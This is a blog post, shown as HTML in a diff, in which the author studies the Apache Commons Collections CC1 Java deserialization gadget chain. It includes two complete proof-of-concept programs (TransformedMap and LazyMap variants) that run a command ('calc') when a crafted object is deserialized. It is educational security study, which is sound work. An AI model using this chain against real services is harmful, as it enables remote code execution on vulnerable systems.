@@ -1,0 +1,388 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>CommonCollections1链 分析 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>CommonCollections1链 分析</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/22
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/java/" style="color: #00a596">java</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><strong>本文记录java安全cc链的学习</strong></p>
+<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>首先要知道一些用到的类和接口<br><code>Transformer</code>接口</p>
+<p><img src="https://img-blog.csdnimg.cn/0bc2410045844d5986285a9f3a0f7515.png" alt="在这里插入图片描述"><br>里面有一个待实现的<code>transform</code>方法</p>
+<p><code>InvokerTransformer</code> 相当于重新实现了一个反射<br><img src="https://img-blog.csdnimg.cn/da2d087bc5db4818aa2f789fab3f2888.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/941f80dfa3c2483c9aa822c3937f434e.png" alt="在这里插入图片描述"><br>比如这样可以弹计算器<br><img src="https://img-blog.csdnimg.cn/3f19b14441f7432d8378a0dd2e176cb1.png" alt="在这里插入图片描述"></p>
+<p><code>ChainedTransformer</code><br><img src="https://img-blog.csdnimg.cn/ef7e59261f92453ba42568f3d0f8bea4.png" alt="在这里插入图片描述"><br>需要传一个Transformer数组<br>在其transform方法中可以按数组顺序逐一带入<br><code>ConstantTransformer</code><br>不管接收什么都返回一个常量 在构造函数赋值<br><code>TransformedMap</code><br><img src="https://img-blog.csdnimg.cn/a546475c6230477b83a0064ecd04d2da.png" alt="在这里插入图片描述"><br>接收一个map两个Transformer<br><img src="https://img-blog.csdnimg.cn/fb00f73169db46b28e5660a548a2c2a1.png" alt="在这里插入图片描述"></p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我们最终想调用invokerTransformer的transform方法<br>那我们就要找谁调用了transform<br><img src="https://img-blog.csdnimg.cn/6e359bc9ce7348edb8f620a0cc6dfa4c.png" alt="在这里插入图片描述"><br>这里考虑<code>TransformedMap</code>类<br><img src="https://img-blog.csdnimg.cn/38949c5621ae46c3a05a3e3f5dd2acf1.png" alt="在这里插入图片描述"><br>然后看valueTransform是怎么来的<br>之前在看相关类的时候已经知道了 有一个Protected的构造函数 这里通过decorate方法得到的<br><img src="https://img-blog.csdnimg.cn/af955abcd33b41009d3fc656854a57f3.png" alt="在这里插入图片描述"></p>
+<p>那么我们先就如上的链子试试能不能连上<br><img src="https://img-blog.csdnimg.cn/a9efd0a046b74ea1ac0fd9dd1953e998.png"><br>继续跟链子</p>
+<p>我们发现<code>AbstractInputCheckedMapDecorator</code>类中的<code>MapEntry</code>类的<code>setValue</code>方法调用了<code>checkSetValue</code><br>且<code>TransformedMap</code>继承<code>AbstractInputCheckedMapDecorator</code><br><img src="https://img-blog.csdnimg.cn/7cd408f01af7493eb5c2e0539cd9b436.png" alt="在这里插入图片描述"><br>所以我们只需要遍历map就可以进setValue<br><img src="https://img-blog.csdnimg.cn/c99bec8f24334fe1a62b53db37a5dc4f.png" alt="在这里插入图片描述"><br>现在变成了 我们需要找到 一个地方遍历数组并调用了setValue<br>然后发现<code>AnnotationInvocationHandler</code>类中的<code>readObject</code>方法直接有调用<code>setValue</code></p>
+<p><img src="https://img-blog.csdnimg.cn/2a8a1518b5dc4cd3a9169d7a34245806.png" alt="在这里插入图片描述">继续观察 要想执行到setValue还需要一定的条件<br><img src="https://img-blog.csdnimg.cn/a2589f41abb546a99c64a1b33f4836a1.png" alt="在这里插入图片描述"></p>
+<p>首先是<code>memberType</code>非空<br>然后判断value是否是memberType的实例<br>并且我们知道Runtime是没有基础Serializable接口的我们需要用反射去拿Runtime的对象</p>
+<p>我们先考虑Runtime的问题,需要反射<br>拿InvokerTransformer实现就是这样</p>
+<pre><code class="java">        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                .transform(Runtime.class);
+        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;Runtime.class,null&#125;).transform(getRuntimeMethod);
+        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);
+</code></pre>
+<p>看起来很繁琐 我们可以用之前提到的ChainedTransformer来包裹<br>也就是这样</p>
+<pre><code class="c">        Transformer[] transformers = new Transformer[]&#123;
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                ,new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;)
+                ,new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        chainedTransformer.transform(Runtime.class);
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/6174fc5061794ddc9e8cf8105625299c.png" alt="在这里插入图片描述"><br>然后解决memberType的问题 首先是注解必须要有属性 然后map的key得是属性名<br>我们可以考虑用Target注解的value</p>
+<p>可以顺利进语句<br>现在我们只需要想办法控制<code>setValue</code>中的数据就可以了<br>考虑开始说的<code>ConstantTransformer</code> 把<code>Runtime.class</code>传给他就行<br>于是整个链子代码如下</p>
+<pre><code class="java">package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+public class App 
+&#123;
+    public static void main(String[] args) throws Exception &#123;
+
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class)
+                ,new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                ,new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;)
+                ,new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+//        chainedTransformer.transform(Runtime.class);
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+
+        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object obj = constructor.newInstance(Target.class,decoratedMap);
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object object) throws Exception&#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(object);
+    &#125;
+    public static Object unSerialize(String path) throws Exception&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+
+</code></pre>
+<h2 id="lazyMap"><a href="#lazyMap" class="headerlink" title="lazyMap"></a>lazyMap</h2><p>上面那个是一个版本 还有一个版本是基于lazyMap的<br>前面都一样 就<code>TransformedMap</code>改成了<code>LazyMap</code><br>我们发现<code>invoke</code>方法中调用了get方法<br>所以我们需要一个动态代理类去代理<code>AnnotationInvocationHandler</code>类 然后调用任意方法 就可以执行<code>invoke</code>方法</p>
+<p><img src="https://img-blog.csdnimg.cn/85412c3467d74a84b49d33cca0f5e8b0.png" alt="在这里插入图片描述"><br>要确保执行到<code>memberValues.get</code>我们不能调有参方法<br>然后只要<code>memberValues</code>是<code>LazyMap</code>的代理类就行<br>刚好 <code>AnnotationInvocationHandler</code> 实现了 <code>InvocationHandler</code>	<img src="https://img-blog.csdnimg.cn/7505191d306b42ebb957f8ca41e2f02e.png" alt="在这里插入图片描述"><br>那么现在的问题就是找无参方法 <img src="https://img-blog.csdnimg.cn/99335e043b7f45a0b1695b80b7c9ce5f.png" alt="在这里插入图片描述"><br><code>entrySet</code>就很好<br>于是链子如下</p>
+<pre><code class="java">package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class App 
+&#123;
+    public static void main(String[] args) throws Exception &#123;
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class)
+                ,new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                ,new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;)
+                ,new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Constructor annotationInvocationHandlerConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        annotationInvocationHandlerConstructor.setAccessible(true);
+
+
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+        LazyMap lzMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        InvocationHandler lzInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, lzMap);
+        Map proxyLazyMap = (Map) Proxy.newProxyInstance(lzMap.getClass().getClassLoader(), lzMap.getClass().getInterfaces(), lzInvocationHandler);
+
+        Object obj = annotationInvocationHandlerConstructor.newInstance(Override.class, proxyLazyMap);
+        
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object object) throws Exception&#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(object);
+    &#125;
+    public static Object unSerialize(String path) throws Exception&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+
+</code></pre>
+<p>这里在反序列化的时候会抛<code>ClassCastException</code>的异常 不过不影响执行</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
